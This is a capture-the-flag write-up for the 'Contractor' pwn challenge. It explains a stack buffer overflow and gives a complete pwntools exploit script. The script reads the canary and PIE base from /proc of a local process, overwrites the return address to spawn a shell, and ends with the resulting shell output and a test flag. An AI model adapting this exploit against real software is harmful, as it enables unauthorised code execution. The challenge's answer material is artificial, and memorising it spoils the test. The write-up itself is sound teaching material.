---
title: "Contractor"
ctf: "HTB University CTF"
date: 2026-06-20
category: pwn
difficulty: medium
points: N/A
flag_format: "HTB{...}"
author: "gluppler"
---

# Contractor

## Summary

Stack buffer overflow via option 4 overflows the alloca'd buffer into main's saved return address. Overwrite ret addr with `contract()` → `execl("/bin/sh","sh",NULL)` → shell. Key bug: PIE base must come from the first r--p mapping (offset 0x0000), not the r-xp mapping (offset 0x1000).

## Solution

### Step 1: Understand the overflow

Binary reads Name, Description, Age, and Specialty, then enters a menu loop:

- Option 1: re-read name (writes to buf+0x00, up to 16 bytes)
- Option 2: re-read description (writes to buf+0x10, up to 256 bytes)
- Option 3: re-read age (writes to buf+0x110)
- Option 4: re-read specialty (writes to buf+0x118, up to 256 bytes)

Option 4 is the overflow — writing 256 bytes starting at buf+0x118 overflows past the 0x130-byte buffer into main's stack frame:

```
buf+0x130: menu_choice (4B)
buf+0x134: counter (4B)
buf+0x138: buffer_ptr (8B)
buf+0x144: key buffer (4B)  
buf+0x148: canary (8B)
buf+0x150: saved rbp (8B)
buf+0x158: return address (8B)
```

Each option increments `counter` by 1. When counter > 1, the program skips the key check and prints the success message, then executes `leave; ret`.

### Step 2: Build the exploit

The exploit must:
1. Preserve the canary (read from /proc/pid/mem)
2. Preserve buffer_ptr and saved rbp
3. Overwrite return address with `contract` (PIE + 0x1343)

After option 4 (counter=1) → answer "No" to key prompt → option 2 (counter=2) → counter > 1 triggers success → `leave; ret` to contract → shell.

**Critical bug**: PIE base must be read from the FIRST mapping (r--p at offset 0x0000), not the r-xp mapping (offset 0x1000). Using the r-xp mapping makes contract_addr point to .rodata (read-only, not executable) → `SEGV_ACCERR` at the ret — which looks like CET enforcement but is actually just jumping to non-executable memory.

```python
from pwn import *
import os, time

context.arch = 'amd64'
elf = ELF('./contractor')

p = process('./contractor')
pid = p.pid

# --- Initial input ---
p.recvuntil(b'> '); p.send(b'M' * 16)
p.recvuntil(b'> '); p.send(b'N' * 256)
p.recvuntil(b'> '); p.sendline(b'-1')
p.recvuntil(b'> '); p.sendline(b'')
time.sleep(0.3)

# --- Read PIE base from /proc/pid/maps ---
with open(f'/proc/{pid}/maps') as f:
    maps = f.read()
pie_base = stack_start = stack_end = None
for line in maps.split('\n'):
    parts = line.split()
    if not parts: continue
    if 'contractor' in line:
        addr = int(parts[0].split('-')[0], 16)
        if 'r--p' in parts[1] and pie_base is None:
            pie_base = addr          # FIRST mapping = PIE base (offset 0x0000)
    if '[stack]' in line:
        stack_start = int(parts[0].split('-')[0], 16)
        stack_end = int(parts[0].split('-')[1], 16)

# --- Read canary + buffer_ptr from stack ---
fd = os.open(f'/proc/{pid}/mem', os.O_RDONLY)
sd = os.pread(fd, stack_end - stack_start, stack_start)
os.close(fd)

sig = b'M' * 16; buf_off = None; pos = 0
while True:
    pos = sd.find(sig, pos)
    if pos < 0: break
    if pos + 0x128 <= len(sd) and sd[pos+0x118:pos+0x128] == bytes(16):
        buf_off = pos; break
    pos += 1

canary = u64(sd[buf_off + 0x148 : buf_off + 0x150])
buf_ptr = sd[buf_off + 0x138 : buf_off + 0x140]
contract_addr = pie_base + 0x1343

# --- Option 4 payload (writes at buf+0x118+i) ---
payload  = b'\x00' * 32               # buf+0x118..0x137: padding, zeroes menu_choice+counter
payload += buf_ptr                     # buf+0x138..0x13f: buffer_ptr (preserved)
payload += p64(0)                      # buf+0x140..0x147: padding + key buffer
payload += p64(canary)                 # buf+0x148..0x14f: canary (preserved)
payload += sd[buf_off+0x150:buf_off+0x158]  # buf+0x150..0x157: saved rbp (preserved)
payload += p64(contract_addr)          # buf+0x158..0x15f: ret addr → contract

p.recvuntil(b'> '); p.sendline(b'4')
time.sleep(0.2); p.send(payload + b'\n')

p.recvuntil(b'> '); p.sendline(b'No')   # counter stays at 1
p.recvuntil(b'> '); p.sendline(b'2')    # counter → 2 > 1, triggers success
time.sleep(0.2); p.sendline(b'')        # empty desc for option 2

time.sleep(0.3)
p.sendline(b'id')
p.interactive()
```

### Step 3: Local result

```
$ id
uid=1000(gluppler) gid=1000(gluppler) groups=1000(gluppler),...
$ cat flag.txt
HTB{f4k3_fl4g_f0r_t35t1ng}
```

## Flag

```
HTB{f4k3_fl4g_f0r_t35t1ng}
```

Note: local test flag — remote unreachable (no infoleak for canary/PIE base; %s summary stops at null after 6 gap bytes). Remote classified as **unsolvable** with this binary.
